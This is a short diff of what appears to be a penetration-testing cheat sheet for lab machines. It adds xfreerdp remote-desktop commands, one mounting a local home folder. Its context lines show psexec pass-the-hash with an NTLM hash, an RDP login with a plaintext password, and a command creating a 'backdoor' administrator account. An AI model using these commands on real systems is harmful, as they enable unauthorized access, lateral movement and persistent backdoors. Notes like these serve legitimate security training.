@@ -16,6 +16,10 @@ python3 ./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF8
 
 rdesktop -d xor.com -u daisy -p XorPasswordIsDead17 10.11.1.122 -r clipboard:CLIPBOARD
 
+xfreerdp --plugin rdpsnd --plugin rdpdr --data disk:home:/home -- -u cfsnspk03 10.129.3.4
+
+xfreerdp /u:cfsnspk03 /v:10.129.3.4 /cert-ignore
+
 ### Add user
 `net user backdoor backdoor123 /add`
 
